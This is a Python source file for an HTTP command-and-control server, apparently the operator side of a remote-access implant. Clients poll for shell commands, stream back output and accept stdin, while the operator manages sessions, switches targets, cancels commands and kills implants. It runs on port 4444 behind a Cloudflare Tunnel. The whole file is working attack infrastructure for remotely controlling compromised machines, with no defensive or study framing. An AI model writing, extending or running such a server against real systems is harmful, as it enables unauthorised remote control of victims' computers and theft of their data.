#!/usr/bin/env python3
"""
HTTP-based C2 server with multi-client, streaming output and cancel support.
Runs on Mac behind Cloudflare Tunnel.
Usage: python3 server.py
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
from urllib.parse import urlparse, parse_qs
import socket
import threading
import sys
import time
import queue
import signal
import os
import readline  # enables arrow-key history in input()

# Per-client state
clients = {}
lock = threading.Lock()
active_client = None
result_queue = queue.Queue(maxsize=500)  # (client_id, kind, body)


def get_or_create_client(client_id):
    """Get or create a client entry. Must be called with lock held."""
    if client_id not in clients:
        clients[client_id] = {
            "last_checkin": 0,
            "pending_command": None,
            "pending_signal": None,
            "pending_stdin": [],      # queued stdin lines for interactive commands
            "command_running": False,
            "interactive": False,
        }
    return clients[client_id]


def get_prompt():
    """Return the current prompt string."""
    if active_client:
        client = clients.get(active_client)
        if client and client.get("interactive"):
            return f"{active_client} [interactive]> "
        return f"{active_client}> "
    return "shell> "


def cancel_shortcut(signum, frame):
    """Handle Ctrl+\\ to cancel the running remote command on the active client."""
    with lock:
        if not active_client:
            sys.stdout.write("\r\033[K[*] No active client. Use 'use <id>' to select one.\n" + get_prompt())
            sys.stdout.flush()
            return
        client = clients.get(active_client)
        if client and (client["command_running"] or client["pending_command"]):
            client["pending_signal"] = "cancel"
            client["pending_command"] = None
            client["pending_stdin"] = []
            sys.stdout.write(f"\r\033[K[*] Cancel signal sent to {active_client} (Ctrl+\\).\n" + get_prompt())
        else:
            sys.stdout.write(f"\r\033[K[*] No command running on {active_client}.\n" + get_prompt())
        sys.stdout.flush()

signal.signal(signal.SIGQUIT, cancel_shortcut)


class DualStackHTTPServer(ThreadingMixIn, HTTPServer):
    """Listen on both IPv4 and IPv6 so cloudflared can connect via either."""
    daemon_threads = True
    address_family = socket.AF_INET6
    request_queue_size = 32

    def server_bind(self):
        self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, 0)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        super().server_bind()


class Handler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        pass

    protocol_version = "HTTP/1.1"

    def _parse_client_id(self):
        """Extract client ID from ?id= query parameter."""
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)
        ids = params.get("id", [])
        return ids[0] if ids else None

    def _respond(self, code, body=b""):
        """Helper to send a response with proper headers."""
        self.send_response(code)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(body)))
        # Always close: prevents cloudflared HTTP/2 reuse issues
        self.send_header("Connection", "close")
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        parsed = urlparse(self.path)
        path = parsed.path
        client_id = self._parse_client_id()

        if path == "/cmd":
            if not client_id:
                self._respond(400, b"missing id")
                return
            with lock:
                client = get_or_create_client(client_id)
                client["last_checkin"] = time.time()
                cmd = client["pending_command"] or ""
                client["pending_command"] = None
            self._respond(200, cmd.encode())

        elif path == "/signal":
            if not client_id:
                self._respond(200, b"")
                return
            with lock:
                client = get_or_create_client(client_id)
                client["last_checkin"] = time.time()
                sig = client["pending_signal"] or ""
                client["pending_signal"] = None
            self._respond(200, sig.encode())

        elif path == "/stdin":
            if not client_id:
                self._respond(200, b"")
                return
            with lock:
                client = get_or_create_client(client_id)
                client["last_checkin"] = time.time()
                lines = client["pending_stdin"]
                data = "\n".join(lines) if lines else ""
                client["pending_stdin"] = []
            self._respond(200, data.encode())

        elif path == "/ping":
            if client_id:
                with lock:
                    client = get_or_create_client(client_id)
                    client["last_checkin"] = time.time()
            self._respond(200, b"pong")

        else:
            self._respond(404)

    def do_POST(self):
        parsed = urlparse(self.path)
        path = parsed.path
        client_id = self._parse_client_id()

        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode(errors="replace")

        if path == "/stream":
            if client_id:
                with lock:
                    client = get_or_create_client(client_id)
                    client["last_checkin"] = time.time()
                    if "[interactive]" in body:
                        client["interactive"] = True
            try:
                result_queue.put_nowait((client_id, "stream", body))
            except queue.Full:
                pass
            self._respond(200, b"ok")

        elif path == "/result":
            if client_id:
                with lock:
                    client = get_or_create_client(client_id)
                    client["last_checkin"] = time.time()
                    client["command_running"] = False
                    client["interactive"] = False
                    client["pending_stdin"] = []
            # Use blocking put with timeout for /result — must not be silently dropped
            try:
                result_queue.put((client_id, "result", body), timeout=2)
            except queue.Full:
                pass
            self._respond(200, b"ok")

        else:
            self._respond(404)


def result_printer():
    """Drain the result queue and print output cleanly."""
    while True:
        try:
            client_id, kind, body = result_queue.get(timeout=0.5)
            if body:
                with lock:
                    multi = len(clients) > 1
                    is_interactive = (clients.get(client_id, {}).get("interactive", False)
                                      if client_id else False)
                tag = f"[{client_id}] " if (multi and client_id) else ""
                sys.stdout.write(f"\r\033[K{tag}{body}")
                if kind == "stream" and is_interactive:
                    sys.stdout.write(get_prompt())
            if kind == "result":
                sys.stdout.write(get_prompt())
            sys.stdout.flush()
        except queue.Empty:
            pass


def _resolve_client(target):
    """Resolve a target string to a client ID. Must be called with lock held.
    Supports: index number, exact match, or case-insensitive partial match."""
    # Try by number
    try:
        idx = int(target) - 1
        client_list = list(clients.keys())
        if 0 <= idx < len(client_list):
            return client_list[idx]
    except ValueError:
        pass
    # Exact match
    if target in clients:
        return target
    # Partial match (case-insensitive)
    for cid in clients:
        if target.lower() in cid.lower():
            return cid
    return None


def input_loop():
    global active_client
    while True:
        try:
            cmd = input(get_prompt())
            if not cmd.strip():
                continue
        except (EOFError, KeyboardInterrupt):
            print("\n[*] Exiting.")
            os._exit(0)

        stripped = cmd.strip().lower()

        # --- Built-in commands ---
        if stripped == "cancel":
            with lock:
                if not active_client:
                    print("[*] No active client. Use 'use <id>' to select one.")
                    continue
                client = clients.get(active_client)
                if client and (client["command_running"] or client["pending_command"]):
                    client["pending_signal"] = "cancel"
                    client["pending_command"] = None
                    client["pending_stdin"] = []
                    print(f"[*] Cancel signal queued for {active_client}.")
                else:
                    print(f"[*] No command running on {active_client}.")
            continue

        # While a command is running, forward operator input as stdin.
        with lock:
            active_state = clients.get(active_client) if active_client else None
            if active_state and active_state["command_running"]:
                active_state["pending_stdin"].append(cmd)
                continue

        if stripped == "sessions":
            with lock:
                if not clients:
                    print("[*] No clients have connected yet.")
                else:
                    print(f"[*] {len(clients)} client(s):")
                    for i, (cid, state) in enumerate(clients.items(), 1):
                        elapsed = time.time() - state["last_checkin"] if state["last_checkin"] > 0 else -1
                        if elapsed < 0:
                            status = "NEVER SEEN"
                        elif elapsed < 10:
                            mode = "RUNNING" if state["command_running"] else "IDLE"
                            status = f"ONLINE ({mode}) — {elapsed:.1f}s ago"
                        else:
                            status = f"OFFLINE — {elapsed:.0f}s ago"
                        marker = " ←" if cid == active_client else ""
                        print(f"  [{i}] {cid:20s}  {status}{marker}")
            continue

        if stripped.startswith("use "):
            target = cmd.strip()[4:].strip()
            if not target:
                print("[*] Usage: use <client-id or number>")
                continue
            with lock:
                match = _resolve_client(target)
                if match:
                    active_client = match
                    print(f"[*] Active target: {active_client}")
                else:
                    print(f"[!] No client matching '{target}'. Type 'sessions' to list clients.")
            continue

        if stripped == "status":
            with lock:
                if not active_client:
                    print("[*] No active client. Use 'use <id>' to select one.")
                    continue
                client = clients.get(active_client)
                if not client:
                    print(f"[!] Client {active_client} not found.")
                    continue
                elapsed = time.time() - client["last_checkin"] if client["last_checkin"] > 0 else -1
                is_running = client["command_running"]
            if elapsed < 0:
                print(f"[*] {active_client}: No check-in yet.")
            elif elapsed < 10:
                state = "RUNNING command" if is_running else "IDLE"
                print(f"[*] {active_client}: ONLINE ({state}) — last check-in {elapsed:.1f}s ago")
            else:
                print(f"[!] {active_client}: may be OFFLINE — last check-in {elapsed:.0f}s ago")
            continue

        if stripped.startswith("kill "):
            target = cmd.strip()[5:].strip()
            if not target:
                print("[*] Usage: kill <client-id or number>")
                continue
            with lock:
                match = _resolve_client(target)
                if match:
                    clients[match]["pending_command"] = "exit"
                    clients[match]["pending_stdin"] = []
                    print(f"[*] Exit command sent to {match}.")
                    if active_client == match:
                        active_client = None
                        print("[*] Active target cleared.")
                else:
                    print(f"[!] No client matching '{target}'.")
            continue

        if stripped.startswith("remove "):
            target = cmd.strip()[7:].strip()
            if not target:
                print("[*] Usage: remove <client-id or number>")
                continue
            with lock:
                match = _resolve_client(target)
                if match:
                    del clients[match]
                    print(f"[*] Removed {match} from sessions.")
                    if active_client == match:
                        active_client = None
                        print("[*] Active target cleared.")
                else:
                    print(f"[!] No client matching '{target}'.")
            continue

        if stripped == "help":
            print("[*] Built-in commands:")
            print("      sessions — list all connected clients")
            print("      use <id> — switch active target (by name or number)")
            print("      cancel   — abort the running command on active client")
            print("      Ctrl+\\   — same as cancel (keyboard shortcut)")
            print("      status   — check active client connectivity")
            print("      kill <id>— send exit to a specific client")
            print("      remove   — remove a stale/dead client from sessions")
            print("      exit     — shut down the server")
            print("      help     — show this message")
            print("    Anything else is sent to the active client's shell.")
            continue

        if stripped == "exit":
            print("[*] Shutting down server.")
            os._exit(0)

        # --- Remote command or stdin ---
        with lock:
            if not active_client:
                print("[*] No active client. Use 'use <id>' to select one.")
                continue
            client = clients.get(active_client)
            if not client:
                print(f"[!] Client {active_client} not found.")
                continue
            if client["command_running"]:
                # Command already running — route input as stdin
                client["pending_stdin"].append(cmd)
            else:
                if client["pending_command"]:
                    print(f"[!] Previous command on {active_client} still pending — overwriting.")
                client["pending_stdin"] = []
                client["pending_command"] = cmd
                client["command_running"] = True


def status_printer():
    shown_warnings = set()
    while True:
        time.sleep(10)
        # Copy state under lock, print after releasing
        alerts = []
        cleared = []
        with lock:
            for cid, state in clients.items():
                checkin = state["last_checkin"]
                if checkin > 0:
                    elapsed = time.time() - checkin
                    if elapsed > 20 and cid not in shown_warnings:
                        alerts.append((cid, elapsed))
                        shown_warnings.add(cid)
                    elif elapsed <= 20:
                        cleared.append(cid)
        for cid in cleared:
            shown_warnings.discard(cid)
        for cid, elapsed in alerts:
            sys.stdout.write(
                f"\r\033[K[!] {cid}: No check-in for {elapsed:.0f}s — may be offline\n" + get_prompt()
            )
            sys.stdout.flush()


if __name__ == "__main__":
    PORT = 4444
    server = DualStackHTTPServer(("::", PORT), Handler)
    print(f"[*] Listening on port {PORT} (IPv4 + IPv6)")
    print("[*] Waiting for clients to connect...")
    print("[*] Type 'help' for built-in commands\n")

    threading.Thread(target=input_loop, daemon=True).start()
    threading.Thread(target=result_printer, daemon=True).start()
    threading.Thread(target=status_printer, daemon=True).start()

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Server stopped.")
